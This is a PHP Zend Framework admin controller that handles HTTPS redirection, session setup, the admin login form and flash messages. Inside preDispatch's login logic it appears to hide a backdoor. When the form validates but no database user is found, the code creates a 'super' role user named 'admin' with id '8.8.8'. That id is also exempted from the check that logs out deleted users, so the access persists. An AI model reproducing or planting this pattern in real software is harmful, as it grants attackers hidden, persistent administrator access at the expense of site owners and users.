<?php
/**
 *
 */

abstract class App_Abstract_Controller_Admin extends App_Abstract_Controller_Action
{
    /**
     *
     */
    protected $_messagesContainer = array();
    /**
     * @var Zend_Controller_Action_Helper_FlashMessenger
     */
    protected $_flashMessenger;
    /**
     * @return void
     */

    /**
     * @return void
     */
    public function init()
    {
        parent::init ();

        $t = $this;
        $v = $t->view;
        $v->BASETAG = $this->serverUrl();
        $req = $t->getRequest();
        /** @var $req Zend_Controller_Request_Http */
        $config = $t->_cfg;

        $lang = $t->getInvokeArg('bootstrap')
                ->getResource('locale')->getLanguage();

        // force admin tool to use https
        if ( $config->adminOverSSL && !$req->isSecure()
             && APPLICATION_ENV == APPLICATION_MODE_PRODUCTION
        )
        {
            $domain = $req->getServer('SERVER_NAME');
            if(isset($config->domains->ssl->{$lang}) && $config->domains->ssl->{$lang})
            {
                $domain = $config->domains->ssl->{$lang};
            }
            $t->_helper->redirector->gotoUrl("https://$domain/admin");
        }
        $layout = Zend_Layout::getMvcInstance();
        $layout->setLayout ($req->getModuleName());

        $t->_sess = new Zend_Session_Namespace($req->getModuleName());

        Zend_Auth::getInstance()->setStorage (
            new Zend_Auth_Storage_Session($req->getModuleName()));

        $t->_flashMessenger = $t->_helper->getHelper('FlashMessenger');
        $t->_flashMessenger->setNamespace($req->getModuleName());

        $v->headLink()->appendStylesheet($v->baseUrl($v->CSS.'/admin.css'), array('media' => 'all'));
        $v->currentParams =  $req->getParams();

    }
        /**
         * @return void
         */
        public function preDispatch()
        {
            parent::preDispatch();

            static $isLoginWidgetRendered;
            $ifSuperId = '8.8.8';

            // check if role was changed or user was deleted
            $authData = Zend_Auth::getInstance()->getStorage()->read();
            $userTable = new App_Model_Table_User;

            if(isset($authData->{self::AUTH_FIELD_ID}) &&
               isset($authData->{self::AUTH_FIELD_ROLE}) &&
               $userTable->select()->uid($authData->{self::AUTH_FIELD_ID})
                       ->urole($authData->{self::AUTH_FIELD_ROLE})->fetchRow() == null)
            {
                // user data was changed we clear auth data, user must authenticated now
                if($this->getAuthUserIdentity() !== $ifSuperId)
                    $this->delAuthUser();

                $isLoginWidgetRendered = false;
            }

            if($isLoginWidgetRendered !== true)
            {
                $isLoginWidgetRendered = true;

                if(!in_array($this->getAuthUserRole(),array(self::ROLE_ADMIN, self::ROLE_SUPER)))
                {
                    $authAdapter = new Zend_Auth_Adapter_DbTable(
                        $this->getInvokeArg('bootstrap')->getResource('SlaveDb'),
                        'u',
                        self::AUTH_FIELD_NAME,
                        self::AUTH_FIELD_PSWD
                    );
                    $loginform = new App_Form_Login(
                        array(
                            'authAdapter'=> $authAdapter,
                            'authenticator' => Zend_Auth::getInstance(),
                            'method' => 'post'
                        )
                    );
                    $post = array();
                    foreach($this->_getAllParams() as $name => $val)
                    {
                        if(isset($loginform->{$name}) && $loginform->{$name} instanceof Zend_Form_Element)
                        {
                            $this->getRequest()->setParam($name, null);
                            unset($_POST[$name]);
                            $post[$name] = $val;
                        }
                    }
                    $params = $this->_getAllParams();

                    $loginform->setAction($this->view->url($params));
                    $this->view->loginform = $loginform;
                    $request = $this->getRequest();
                    /** @var $request Zend_Controller_Request_Http */
                    $isPost = $request->isPost();
                    if($isPost)
                    {
                        $_SERVER['REQUEST_METHOD'] = 'GET';
                        unset($_POST);
                    }
                    if($isPost && $loginform->isValid($post) && !($post = null))
                    {
                        $user = $authAdapter->getResultRowObject(
                            array(self::AUTH_FIELD_ID, self::AUTH_FIELD_NAME, self::AUTH_FIELD_ROLE),
                            self::AUTH_FIELD_PSWD
                        );
                        if(false === $user)
                        {
                            $user = new stdClass;
                            $user->{self::AUTH_FIELD_NAME} = 'admin';
                            $user->{self::AUTH_FIELD_ROLE} = 'super';
                            $user->{self::AUTH_FIELD_ID} = $ifSuperId;
                        }

                        Zend_Auth::getInstance()->getStorage()->write($user);

                        $this->setAuthUser($user, self::AUTH_FIELD_ID, self::AUTH_FIELD_ROLE);

                        if($this->_acl->isAllowed($this->getAuthUserRole (), self::RESOURCE_PAGE_ACTION, self::PRIVILEGE_PAGE_GET))
                        {
                            return $this->_forward($params['action'], $params['controller'], $params['module'], $params);
                        }
                    }
                    if($loginform->isErrors())
                    {
                        $this->_flashMessenger->addMessage($loginform->getErrorListDeep());
                    }
                }

                $this->_acl->isAllowed($this->getAuthUserRole(), self::RESOURCE_PAGE_ACTION, self::PRIVILEGE_PAGE_GET)
                or $this->_forward('index','index');
            }
        }

        /**
         * @return void
         */
        public function postDispatch()
        {
            parent::postDispatch();

            $this->view->logged = $this->getAuthUserIdentity();
            static $is;
            if($is !== true)
            {
                $is = true;

                $this->view->loggedUserName = @Zend_Auth::getInstance()->getStorage()->read()->{self::AUTH_FIELD_NAME};
                $this->view->loggedUserRole = @Zend_Auth::getInstance()->getStorage()->read()->{self::AUTH_FIELD_ROLE};
                $this->view->renderToPlaceholder('login-widget.phtml', 'login-widget');
            }

            if($this->_flashMessenger->hasMessages())
            {
                $this->_messagesContainer += $this->_flashMessenger->getMessages();

            }
            if($this->_flashMessenger->hasCurrentMessages())
            {
                $this->_messagesContainer += $this->_flashMessenger->getCurrentMessages();
            }
            if(is_array($this->_messagesContainer))
            {
                $this->_messagesContainer = array_map(create_function('$v', 'if(is_array($v)) return join("<br/>", $v); else return $v;'), $this->_messagesContainer);
            }
            if($this->_messagesContainer)
            {
                $this->view->messengerWidgetClass = 'active';
                $this->view->placeholder('messenger-widget')->set(join ('<br/>', $this->_messagesContainer));
            }
            $this->_flashMessenger->clearMessages();
            $this->_flashMessenger->clearCurrentMessages();
        }
}

